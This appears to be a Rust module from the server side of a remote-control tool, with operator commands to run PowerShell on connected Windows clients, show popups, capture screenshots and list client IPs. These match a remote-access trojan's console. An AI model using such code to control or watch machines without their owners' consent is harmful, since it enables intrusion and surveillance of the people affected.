use lib::{Command};
use crate::client::ClientHandle;
use crate::error::CommandErr;
use crate::error::CommandErr::*;


/// Echoes a message to a given client
pub(crate) fn echo(handle: ClientHandle, message: String) -> Result<String, CommandErr> {
    let ip = &handle.ip;
    if let Some(buf) = handle.send_to_client(Command::Echo, message.to_string()) {
        let response: String = serde_json::from_slice(&buf)?;
        Ok(format!("Successfully echoed message {} to client with IP {}. Response: {}", message, ip, response))
    } else {
        Err(SendMessageErr(format!("An error occurred while sending message {} to client with IP {}", message, ip), ip.to_string()))
    }
}

/// Echoes a message to all clients
pub(crate) fn echoall(handles: Vec<ClientHandle>, message: String) -> Result<String, CommandErr> {
    log::trace!("Echoall command started");

    let mut error_vec: Vec<CommandErr> = Vec::new();
    
    if handles.is_empty() {
        return Err(NoClientsErr("No clients exist"));
    }
    // Vec might be deadlocked in popup, since it takes a ClientHandle and never returns it
    for handle in handles.iter() {
        dbg!(&handle.ip);
        if let Err(err) = echo(handle.clone(), message.clone()) {
            error_vec.push(err);
        }
    }

    log::trace!("about to return");

    match error_vec.len() {
        0 => Ok(format!("Successfully sent message {} to all clients", message)),
        1 => Err(error_vec[0].clone()),
        _ => Err(MultipleErr(error_vec)),
    }
}

/// Runs a Powershell command on a given client
pub(crate) fn run(handle: ClientHandle, command: String) -> Result<String, CommandErr> {
    log::trace!("Sending command: {}", command);

    if let Some(buf) = handle.send_to_client(Command::Run, command.clone()) {
        let response: String = serde_json::from_slice(&buf)?;
        Ok(format!("Successfully sent command {} to client with IP {}. Response: {}", command, handle.ip, response))
    } else {
        Err(SendMessageErr(format!("An error occurred while sending command {} to client with IP {}", command, handle.ip.clone()), handle.ip))
    }
}

/// Makes a Windows popup message appear on a client's computer
pub(crate) fn popup(handle: ClientHandle, message: String) -> Result<String, CommandErr> {
    if handle.send_to_client(Command::Message, message.clone()).is_some() {
        Ok(format!("Successfully sent popup with message {} to client with IP {}.", message, handle.ip))
    } else {
        Err(SendMessageErr(format!("An error occurred while sending command {} to client with IP {}", message, handle.ip.clone()), handle.ip))
    }
}

/// Screenshots a given client's screen and saves it to a file.
pub(crate) fn screenshot(handle: ClientHandle) -> Result<String, CommandErr> {
    if let Some(buf) = handle.send_to_client(Command::Screenshot, String::new()) {
        // Decode BMP data sent by client
        let image_data: Vec<u8> = serde_json::from_slice(&buf)?;
        std::fs::write("screenshot.bmp", &image_data)?;
        Ok("Screenshot saved to screenshot.bmp".to_string())
    } else {
        Err(SendMessageErr("Did not receive screenshot data from client".to_string(), handle.ip))
    }
}


/// Lists every client IP
pub(crate) fn list(handles: Vec<ClientHandle>) -> Result<String, CommandErr> {
    if handles.is_empty() {
        return Err(NoClientsErr("No clients exist"));
    }
    for handle in handles.iter() {
        log::info!("{}", handle.ip)
    }
    if handles.len() == 1 {
        Ok("Found 1 client".to_string())
    } else {
        Ok(format!("Found {} clients", handles.len()))
    }
}

pub(crate) fn print_help() -> Result<String, CommandErr> {
    Ok("\nAvailable commands:\n\
        \n\
        echo <ip> <message>     - Send a message to a specific client and receive the same message back\n\
        echoall <message>       - Send a message to all connected clients\n\
        run <ip> <command>      - Execute a PowerShell command on a specific client\n\
        popup <ip> <message>    - Display a popup message on a specific client's screen\n\
        screenshot <ip>         - Take a screenshot of a specific client's screen (currently unfinished)\n\
        list                    - Show all connected client IPs\n\
        help                    - Show this help message\n\
        \n\
        Note: <ip> should be the full IP address of the client as shown by the 'list' command".to_string())
}